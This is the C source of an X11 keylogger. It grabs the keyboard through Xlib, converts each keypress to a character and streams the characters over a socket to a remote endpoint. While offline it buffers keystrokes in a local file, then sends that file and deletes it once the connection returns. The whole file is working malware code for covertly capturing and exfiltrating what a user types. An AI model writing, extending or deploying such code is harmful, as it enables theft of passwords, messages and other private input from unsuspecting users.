#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XTest.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "inet_utils.h"
#include "x_utils.h"
#include "file_utils.h"
#include "keylog.h"

int sendMissingStuff() {
		char c;
		char s[2];
		openFile(filename);
		while( (c = getc(fd)) != EOF ) {
			s[0] = c;
			s[1] = '\0';
			sendStr(s);
		}
		closeFile();
		remove(filename);
	return 1;
}

void handleChar(int connected, char *buf) {
	if(connected)
		sendStr(buf);
	else
		appendFile(filename, buf);

	printf("%s", buf);
	fflush(stdout);
}

int main() {
	// open needed stuff
	int connected = connectSocket();
	Display *dpy = XOpenDisplay(NIL);

	// my event
	XEvent event;

	// just in case
	if(connected)
		sendMissingStuff();

	// some stuff for keycode-char conversion
	char buf[2];
	int len;
	KeySym keysym;

	grab(dpy);

	int i = 0;
	while(i < KEYLOGNUM) {

		// check for internet connection
		if(i%CONCHECKINTV == 0 && !connected)
			if( (connected = connectSocket()) )
				sendMissingStuff();

		//printf("\nPending: %i, Queued: %i\n", XEventsQueued(dpy, QueuedAlready), XPending(dpy));

		// get next event
		// XPeekEvent / XNextEvent
		XNextEvent(dpy, &event);
		//XPutBackEvent(dpy, &event);
		//XAllowEvents(dpy, ReplayKeyboard, event.xkey.time);
		//XTestFakeKeyEvent(dpy, event.xkey.keycode, 1, CurrentTime);
		//XFlush(dpy);
		//XSync(dpy, False);
		//XSendEvent(dpy, DefaultRootWindow(dpy), True, KeyPressMask, &event);
		//XSync(dpy, False);

		//int keycode = event.xkey.keycode;

		// convert keycode to character
		if( (len = XLookupString(&event.xkey, buf, 1, &keysym, NULL)) == 0 )
			buf[0] = '\0';

		if(event.type == KeyPress) {
			handleChar(connected, buf);
		}

		i++;
	}

	sendStr("\nEnd of transmission\n");

	ungrab(dpy);
	XCloseDisplay(dpy);
	close(sockfd);

	return 0;
}
